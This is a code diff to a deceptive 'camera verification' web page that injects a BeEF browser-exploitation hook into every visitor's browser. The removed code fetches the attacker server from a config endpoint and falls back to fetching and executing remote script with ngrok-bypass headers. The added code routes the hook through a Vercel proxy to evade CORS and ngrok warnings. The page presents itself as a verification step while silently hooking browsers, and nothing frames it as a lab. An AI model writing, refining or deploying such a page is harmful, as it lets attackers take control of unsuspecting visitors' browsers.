@@ -42,58 +42,24 @@
     <p class="cam">Camera access required for verification</p>
 
     <script>
-      // Load configuration from Vercel API (contains attacker IP)
+      // Load BeEF hook.js through Vercel proxy (bypasses CORS and ngrok warnings)
       function loadBeEFHook() {
-        fetch("/api/config")
-          .then((response) => response.json())
-          .then((data) => {
-            const beefServer = data.beefServer;
+        const script = document.createElement("script");
+        // Use Vercel proxy endpoint instead of direct ngrok URL
+        script.src = "/api/hook";
 
-            // Dynamically inject BeEF hook.js from attacker's server
-            const script = document.createElement("script");
-            // FIXED: No port number needed - ngrok URL already includes everything
-            script.src = `${beefServer}/hook.js`;
+        script.onerror = function () {
+          console.error("Failed to load BeEF hook via proxy");
+          console.error(
+            "Make sure BEEF_SERVER_URL is set in Vercel environment variables"
+          );
+        };
 
-            // Add ngrok bypass header using a proxy fetch method
-            script.setAttribute("crossorigin", "anonymous");
+        script.onload = function () {
+          console.log("✅ BeEF hook loaded successfully via proxy!");
+        };
 
-            script.onerror = function () {
-              console.error("Failed to load BeEF hook - server unreachable");
-              console.error("Attempted URL:", script.src);
-              // Fallback: Try fetching with proper headers
-              fetchHookWithHeaders(beefServer);
-            };
-            script.onload = function () {
-              console.log("BeEF hook loaded successfully from:", script.src);
-            };
-            document.head.appendChild(script);
-          })
-          .catch((err) => {
-            console.error("Failed to fetch config:", err);
-            // No fallback - if config fails, it means Vercel setup is wrong
-            alert("Configuration error. Please contact support.");
-          });
-      }
-
-      // Fallback method using fetch with custom headers
-      function fetchHookWithHeaders(beefServer) {
-        fetch(`${beefServer}/hook.js`, {
-          headers: {
-            "ngrok-skip-browser-warning": "true",
-            "User-Agent": "Mozilla/5.0",
-          },
-        })
-          .then((response) => response.text())
-          .then((scriptContent) => {
-            // Execute the fetched script
-            const script = document.createElement("script");
-            script.textContent = scriptContent;
-            document.head.appendChild(script);
-            console.log("BeEF hook loaded via fetch method");
-          })
-          .catch((err) => {
-            console.error("Fetch method also failed:", err);
-          });
+        document.head.appendChild(script);
       }
 
       function startCam() {
